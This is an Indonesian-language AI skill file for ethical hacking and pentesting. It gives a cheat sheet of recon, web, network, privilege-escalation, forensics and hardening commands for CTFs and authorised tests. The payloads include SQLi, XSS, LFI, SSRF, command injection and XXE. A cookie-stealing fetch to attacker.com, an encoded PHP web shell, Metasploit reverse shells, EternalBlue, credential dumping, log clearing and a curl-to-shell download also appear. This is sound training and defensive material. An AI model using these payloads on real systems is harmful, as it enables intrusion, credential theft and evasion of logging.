---
name: cybersecurity-whitehacker
description: >
  Skill untuk profesional keamanan siber, ethical hacker, penetration tester, dan white hat
  hacker. Gunakan skill ini kapan pun pengguna membutuhkan bantuan terkait: penetration
  testing (pentest), ethical hacking, vulnerability assessment, exploit development untuk
  CTF atau lab resmi, OSINT, recon & enumeration, web application security (XSS, SQLi, SSRF,
  LFI, RFI, IDOR, dll.), network hacking, privilege escalation, reverse engineering, malware
  analysis, forensik digital, keamanan jaringan, hardening sistem, laporan pentest,
  persiapan sertifikasi (CEH, OSCP, CISSP, CompTIA Security+, eJPT), atau topik
  keamanan siber lainnya. Aktif untuk kata kunci seperti "cara hack", "pentest ini",
  "CTF writeup", "exploit vuln", "bypass WAF", "privilege escalation", "analisis malware",
  "report pentest", "hardening server", "OSINT target", dsb.
  PENTING: Skill ini hanya untuk konteks legal — CTF, lab (HackTheBox, TryHackMe, VulnHub),
  authorized pentest, dan edukasi keamanan defensif. Selalu tekankan etika dan legalitas.
---

# Skill Cybersecurity & White Hat Hacker

Skill ini dirancang untuk membantu ethical hacker, penetration tester, security researcher,
dan praktisi keamanan siber dalam konteks yang **legal dan beretika**: CTF, lab resmi,
authorized penetration testing, bug bounty, serta pertahanan dan hardening sistem.

---

## ⚠️ ETIKA & LEGALITAS (WAJIB DIBACA PERTAMA)

### Prinsip Dasar White Hat Hacker

Sebelum membantu aktivitas teknis apapun, selalu ingatkan prinsip berikut:

1. **Authorized Only** — Hanya lakukan pengujian pada sistem yang Anda miliki atau yang
   telah memberikan izin tertulis secara eksplisit.
2. **Do No Harm** — Hindari merusak, menghapus, atau mengekstrak data sensitif pengguna nyata.
3. **Scope Limitation** — Patuhi ruang lingkup (scope) yang telah disepakati dalam penugasan.
4. **Responsible Disclosure** — Laporkan kerentanan kepada pemilik sistem sebelum dipublikasikan.
5. **Documentation** — Dokumentasikan semua aktivitas pengujian sebagai bukti otorisasi.

### Konteks Legal yang Didukung Skill Ini

| Konteks | Contoh Platform / Kasus |
|---|---|
| ✅ CTF (Capture The Flag) | HackTheBox, TryHackMe, PicoCTF, CTFtime.org |
| ✅ Lab & Practice | VulnHub, DVWA, Metasploitable, OWASP WebGoat |
| ✅ Bug Bounty | HackerOne, Bugcrowd, Intigriti, program resmi perusahaan |
| ✅ Authorized Pentest | Dengan Pentest Agreement / Rules of Engagement (RoE) |
| ✅ Security Research | Kerentanan pada software sendiri, publikasi akademik |
| ✅ Defensive Security | Hardening, monitoring, incident response |
| ❌ Unauthorized Access | Sistem tanpa izin, apapun alasannya |
| ❌ Real Target Attack | Menyerang infrastruktur nyata tanpa otorisasi |

### Disclaimer yang Selalu Disertakan

Setiap respons teknis yang berkaitan dengan teknik ofensif **HARUS** memuat catatan:
> *⚠️ Teknik ini hanya untuk digunakan pada sistem yang Anda miliki atau telah
> mendapat izin eksplisit. Penggunaan tanpa otorisasi melanggar hukum (UU ITE No. 19
> Tahun 2016 di Indonesia, CFAA di AS, dan regulasi serupa di negara lain).*

---

## 1. Identifikasi Konteks

Sebelum membantu, identifikasi:
- **Konteks**: CTF / Lab / Bug Bounty / Authorized Pentest / Defensive / Sertifikasi
- **Platform target** (jika CTF/lab): HackTheBox, TryHackMe, VulnHub, dll.
- **Level**: Beginner / Intermediate / Advanced / OSCP-level
- **Fokus area**: Web / Network / Binary / Forensik / OSINT / Mobile / Cloud
- **Output yang diharapkan**: Walkthrough / Eksplanasi konsep / Kode PoC / Laporan / Tips sertifikasi

---

## 2. Domain Teknis & Prosedur

### A. Reconnaissance & OSINT

**Passive Reconnaissance (tanpa menyentuh target):**
```bash
# WHOIS lookup
whois target.com

# DNS enumeration
dig target.com ANY
dnsrecon -d target.com
dnsx -d target.com -a -cname -mx -txt

# Subdomain enumeration (passive)
subfinder -d target.com
amass enum -passive -d target.com
assetfinder target.com

# Google Dorks (passive recon)
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com ext:sql OR ext:env OR ext:log

# Shodan / Censys
shodan search "org:target"
```

**Active Reconnaissance:**
```bash
# Port scanning
nmap -sV -sC -p- --min-rate 5000 -oA scan_result target.com
nmap -sU --top-ports 100 target.com          # UDP scan
rustscan -a target.com -- -sV -sC

# Web tech fingerprinting
whatweb http://target.com
wappalyzer (browser extension)
wafw00f http://target.com                     # WAF detection

# Directory/file enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
feroxbuster -u http://target.com -w wordlist.txt
ffuf -w wordlist.txt -u http://target.com/FUZZ
```

**OSINT Tools:**
- **theHarvester** — email, subdomain, IP dari sumber publik
- **Maltego** — visualisasi relasi entitas (domain, IP, person)
- **Recon-ng** — framework OSINT modular
- **SpiderFoot** — automated OSINT
- **Sherlock** — username enumeration di sosial media
- **ExifTool** — metadata dari file/gambar

---

### B. Web Application Penetration Testing

#### Metodologi (mengikuti OWASP Testing Guide)

```
1. Information Gathering
2. Configuration & Deployment Management Testing
3. Identity Management Testing
4. Authentication Testing
5. Authorization Testing
6. Session Management Testing
7. Input Validation Testing
8. Error Handling
9. Cryptography Testing
10. Business Logic Testing
11. Client-Side Testing
```

#### Kerentanan Utama & Teknik Eksploitasi

**SQL Injection (SQLi):**
```bash
# Manual testing
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL,NULL,NULL--

# sqlmap
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --level=5 --risk=3

# Bypass WAF
'/**/OR/**/'1'='1
' /*!50000OR*/ '1'='1
```

**Cross-Site Scripting (XSS):**
```javascript
// Reflected XSS basic
<script>alert(1)</script>
"><script>alert(document.cookie)</script>

// Bypass filter
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)

// Stored XSS — cookie stealing
<script>fetch('https://attacker.com/?c='+document.cookie)</script>

// DOM-based XSS
#<script>alert(1)</script>
```

**Local/Remote File Inclusion (LFI/RFI):**
```bash
# LFI basic
?page=../../../../etc/passwd
?page=....//....//....//etc/passwd     # Path traversal bypass

# LFI with PHP wrappers
?page=php://filter/convert.base64-encode/resource=index.php
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Log poisoning via LFI
# 1. Inject payload di User-Agent
# 2. Akses log: ?page=../../../../var/log/apache2/access.log
```

**Server-Side Request Forgery (SSRF):**
```
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/  # AWS metadata
http://target.com/fetch?url=http://localhost:8080/admin
http://target.com/fetch?url=file:///etc/passwd

# Bypass filter
http://target.com/fetch?url=http://127.0.0.1
http://target.com/fetch?url=http://0x7f000001         # IP hex
http://target.com/fetch?url=http://2130706433          # IP decimal
```

**Insecure Direct Object Reference (IDOR):**
```
# Change user ID in request
GET /api/user/1001/profile → /api/user/1002/profile
GET /download?file=invoice_1001.pdf → invoice_1002.pdf

# Test dengan dua akun berbeda (A dan B)
# Akses resource akun B menggunakan session akun A
```

**Command Injection:**
```bash
# Basic
; id
| id
`id`
$(id)
& id &

# Bypass space filter
;{id}
;$IFS$9id
```

**XXE (XML External Entity):**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SSRF via XXE -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

#### Tools Web Pentest
- **Burp Suite** (Community/Pro) — intercept, scanner, intruder, repeater
- **OWASP ZAP** — automated scanner open source
- **Nikto** — web server scanner
- **WPScan** — WordPress vulnerability scanner
- **SQLmap** — automated SQL injection
- **XSStrike** — advanced XSS scanner

---

### C. Network Penetration Testing

**Scanning & Enumeration:**
```bash
# Host discovery
nmap -sn 192.168.1.0/24
netdiscover -r 192.168.1.0/24

# Service version + script scan
nmap -sV -sC -p 21,22,23,25,80,110,139,143,443,445,3306,3389 target

# SMB enumeration
enum4linux -a target
smbclient -L //target -N
crackmapexec smb target

# SNMP enumeration
snmpwalk -c public -v1 target
onesixtyone target public

# LDAP enumeration
ldapsearch -x -H ldap://target -b "dc=domain,dc=com"
```

**Exploitation:**
```bash
# Metasploit Framework
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST attacker_ip
set LPORT 4444
run

# EternalBlue (MS17-010) - hanya lab/CTF
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set LHOST attacker_ip
run
```

**Password Attacks:**
```bash
# Hydra — brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target
hydra -l admin -P passwords.txt http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Hashcat — cracking
hashcat -m 0 hash.txt rockyou.txt                     # MD5
hashcat -m 1000 hash.txt rockyou.txt                  # NTLM
hashcat -m 1800 hash.txt rockyou.txt                  # sha512crypt

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

---

### D. Privilege Escalation

#### Linux Privilege Escalation

**Checklist Manual:**
```bash
# Basic info
id; whoami; hostname; uname -a; cat /etc/os-release

# SUDO permissions
sudo -l

# SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Writable files/dirs milik root
find / -writable -type f 2>/dev/null | grep -v proc

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/*

# Capabilities
getcap -r / 2>/dev/null

# Services running as root
ps aux | grep root
netstat -tlnp

# Kernel exploits (cek versi dulu)
uname -r
# searchsploit linux kernel 4.x

# Password hunting
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
cat ~/.bash_history
```

**Automated Tools:**
```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# atau upload manual ke target

# LinEnum
./LinEnum.sh -t

# linux-smart-enumeration
./lse.sh -l 2
```

**GTFOBins** — Referensi SUID/sudo bypass: https://gtfobins.github.io

#### Windows Privilege Escalation

```powershell
# Basic info
whoami /all
systeminfo
net users; net localgroup administrators

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Stored credentials
cmdkey /list
Get-ChildItem -Path C:\ -Include *.xml,*.ini,*.txt -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```

**Automated:**
```powershell
# WinPEAS
.\winPEAS.exe

# PowerUp
Import-Module .\PowerUp.ps1; Invoke-AllChecks

# Seatbelt
.\Seatbelt.exe -group=all
```

---

### E. Post-Exploitation

```bash
# Meterpreter — informasi sistem
sysinfo; getuid; getpid; ps

# Pivoting
# Port forwarding
portfwd add -l 8080 -p 80 -r internal_host

# Dump credentials
hashdump
run post/windows/gather/credentials/credential_collector

# Persistence (hanya lab/CTF)
run post/windows/manage/persistence

# Covering tracks (lab only)
clearev
```

**Lateral Movement:**
- Pass-the-Hash (PtH)
- Pass-the-Ticket (PtT) / Kerberoasting
- Golden/Silver Ticket (Active Directory)
- WMI / PSExec / SMB untuk remote execution

---

### F. Reverse Engineering & Binary Exploitation

**Static Analysis:**
```bash
file binary
strings binary | grep -i "pass\|key\|flag\|http"
objdump -d binary | head -50
readelf -h binary

# Tools
ghidra          # NSA decompiler (free)
ida-free        # IDA Free
radare2         # r2 framework
binary ninja    # commercial
```

**Dynamic Analysis:**
```bash
ltrace ./binary          # library call trace
strace ./binary          # system call trace
gdb ./binary             # debugging

# GDB dengan PEDA/pwndbg/GEF
gdb -q ./binary
(gdb) checksec           # lihat proteksi: NX, PIE, ASLR, Canary
(gdb) run
(gdb) disass main
```

**Buffer Overflow (x86 dasar):**
```python
# Pattern generation
python3 -c "print('A'*100)"
msf-pattern_create -l 200
msf-pattern_offset -q [EIP value]

# pwntools skeleton
from pwn import *
p = process('./binary')
# atau p = remote('host', port)
payload = b'A' * offset + p32(return_address)
p.sendline(payload)
p.interactive()
```

---

### G. Forensik Digital

**Disk Forensics:**
```bash
# Mounting image
sudo mount -o loop,ro image.dd /mnt/forensic

# File recovery
foremost -i image.dd -o output/
photorec image.dd

# Autopsy — GUI forensic tool
autopsy &

# Strings & grep
strings image.dd | grep -i "flag\|password\|secret"
```

**Memory Forensics (Volatility):**
```bash
# Profil otomatis
vol.py -f memory.dmp imageinfo

# List processes
vol.py -f memory.dmp --profile=Win10x64_19041 pslist
vol.py -f memory.dmp --profile=Win10x64_19041 pstree

# Network connections
vol.py -f memory.dmp --profile=Win10x64_19041 netscan

# Dump process
vol.py -f memory.dmp --profile=Win10x64_19041 memdump -p [PID] -D dump/

# Strings dari proses
strings dump/[PID].dmp | grep -i "password\|flag"
```

**Network Forensics:**
```bash
# Wireshark / tshark
tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri
tshark -r capture.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg

# Cari credentials
strings capture.pcap | grep -i "pass\|login\|auth"
```

**Steganografi:**
```bash
steghide extract -sf image.jpg
zsteg image.png                  # LSB steganography
binwalk -e file                  # extract hidden files
exiftool image.jpg               # metadata
```

---

### H. Malware Analysis

**Static Analysis:**
```bash
# File identification
file malware.exe
md5sum malware.exe; sha256sum malware.exe

# PE header analysis
pecheck malware.exe
pestudio malware.exe (GUI Windows)

# Strings
strings malware.exe
FLOSS malware.exe               # extract obfuscated strings

# AV scan
clamscan malware.exe
# Upload ke VirusTotal (public samples only)
```

**Dynamic Analysis (di sandbox terisolasi):**
```bash
# Tools
# - Cuckoo Sandbox (self-hosted)
# - ANY.RUN (online)
# - Hybrid Analysis (online)
# - Joe Sandbox (online)

# Monitor via Procmon, ProcHacker, Wireshark di Windows VM terisolasi
```

**⚠️ Selalu analisis malware di environment terisolasi (VM snapshot, no network ke LAN)**

---

### I. CTF Tips & Tricks

**CTF Categories:**
| Kategori | Topik Utama |
|---|---|
| Web | SQLi, XSS, SSRF, LFI, JWT, OAuth |
| Crypto | Caesar, Vigenere, RSA, AES, hash cracking |
| Forensics | Steganografi, file carving, memory, PCAP |
| Pwn/Binary | Buffer overflow, format string, heap, ROP |
| Reverse | Static/dynamic analysis, anti-debug bypass |
| OSINT | Social media, metadata, geolocation |
| Misc | Encoding, stego, trivia, jail escape |

**Useful CTF Tools:**
```
CyberChef      — encoding/decoding Swiss army knife
dcode.fr       — cipher identifier & solver
crt.sh         — SSL cert transparency (subdomain OSINT)
dnsdumpster    — DNS recon
pwntools       — Python library untuk binary exploit
pycryptodome   — crypto operations
rsactftool     — RSA attack toolkit
stegsolve      — image stego analyzer
```

**CTF Checklist awal:**
```
File diterima → file [nama] → strings [nama] → binwalk [nama]
Web challenge → view source → inspect network → robots.txt → sitemap.xml
Crypto → identifikasi cipher dulu (karakter set, panjang, pola)
Pwn → checksec → fungsi berbahaya (gets, scanf, strcpy) → overflow
```

---

### J. Penetration Testing Report

**Struktur Laporan Pentest Profesional:**

```markdown
# Penetration Test Report
**Klien**: [Nama Perusahaan]
**Tester**: [Nama / Tim]
**Tanggal**: [Range tanggal]
**Versi**: 1.0 — CONFIDENTIAL

---

## Executive Summary
Ringkasan temuan untuk manajemen non-teknis.
Risk rating keseluruhan: Critical / High / Medium / Low

## Scope & Rules of Engagement
- Target: [IP/domain yang diizinkan]
- Periode: [Tanggal mulai – selesai]
- Batasan: [Apa yang tidak boleh dilakukan]

## Metodologi
Sebutkan framework: OWASP, PTES, NIST, OSSTMM

## Temuan (Findings)

### [VULN-001] SQL Injection pada /login
- **Severity**: Critical (CVSS 9.8)
- **Affected URL**: http://target.com/login
- **Deskripsi**: ...
- **Bukti (Evidence)**: [screenshot/request-response]
- **Impact**: Akses database penuh, eksfiltrasi data pengguna
- **Rekomendasi**: Gunakan parameterized queries / prepared statements
- **Referensi**: CWE-89, OWASP A03:2021

## Risk Matrix
| ID | Judul | Severity | Status |
|---|---|---|---|
| VULN-001 | SQL Injection | Critical | Open |

## Rekomendasi Prioritas
1. [Critical] Perbaiki segera dalam 24–48 jam
2. [High] Perbaiki dalam 7 hari
3. [Medium] Perbaiki dalam 30 hari
4. [Low/Info] Perbaiki sesuai jadwal
```

**Severity Rating (CVSS v3.1):**
| Rating | Skor CVSS | Warna |
|---|---|---|
| Critical | 9.0–10.0 | 🔴 Merah Tua |
| High | 7.0–8.9 | 🔴 Merah |
| Medium | 4.0–6.9 | 🟠 Oranye |
| Low | 0.1–3.9 | 🟡 Kuning |
| Informational | 0.0 | 🔵 Biru |

---

### K. Hardening & Defensive Security

**Linux Hardening Checklist:**
```bash
# Update sistem
apt update && apt upgrade -y

# Firewall (UFW)
ufw default deny incoming
ufw default allow outgoing
ufw allow ssh
ufw enable

# SSH hardening (/etc/ssh/sshd_config)
PermitRootLogin no
PasswordAuthentication no
MaxAuthTries 3
AllowUsers [specific_user]

# Fail2ban
apt install fail2ban
systemctl enable fail2ban

# Audit
auditd -e 2
lynis audit system
```

**Web Server Hardening:**
```nginx
# Nginx security headers
add_header X-Frame-Options "SAMEORIGIN";
add_header X-Content-Type-Options "nosniff";
add_header X-XSS-Protection "1; mode=block";
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header Content-Security-Policy "default-src 'self'";
server_tokens off;
```

---

## 3. Sertifikasi Cybersecurity

| Sertifikasi | Level | Fokus | Provider |
|---|---|---|---|
| CompTIA Security+ | Entry | Fondasi keamanan umum | CompTIA |
| eJPT | Entry | Pentest dasar | eLearnSecurity |
| CEH | Intermediate | Ethical hacking metodologi | EC-Council |
| OSCP | Advanced | Pentest praktis (hands-on) | Offensive Security |
| CRTP | Advanced | Active Directory attacks | Pentester Academy |
| CISSP | Expert | Security management | (ISC)² |
| CISM | Expert | Security management | ISACA |

**Tips persiapan OSCP:**
- Selesaikan 50+ mesin di HackTheBox / TryHackMe
- Kuasai manual exploitation (jangan bergantung Metasploit)
- Latih note-taking dan dokumentasi selama pentest
- Buffer overflow Windows x86 wajib dikuasai
- Pelajari pivoting dan tunneling

---

## 4. Resources & Platform Latihan

```
HackTheBox       → https://hackthebox.com     (intermediate–advanced)
TryHackMe        → https://tryhackme.com      (beginner–intermediate)
VulnHub          → https://vulnhub.com        (offline VM)
PicoCTF          → https://picoctf.org        (beginner CTF)
CTFtime          → https://ctftime.org        (jadwal CTF aktif)
PortSwigger Labs → https://portswigger.net/web-security  (web security)
IppSec YouTube   → https://youtube.com/@ippsec (HTB writeups video)
```

---

## 5. Referensi Tambahan

- `references/tools-cheatsheet.md` — Cheatsheet perintah tools utama
- `references/payloads-reference.md` — Payload umum untuk CTF & pentest

---

## 6. Format Respons

Setiap respons teknis harus:
- Menyertakan **disclaimer legalitas** untuk teknik ofensif
- Menjelaskan **konsep di balik teknik**, bukan hanya perintahnya
- Menyertakan **contoh command** yang siap digunakan di lab/CTF
- Memberikan **referensi mitigasi** untuk setiap teknik serangan
- Menggunakan **code blocks** dengan syntax highlighting yang tepat
- Menyebutkan **tools alternatif** jika ada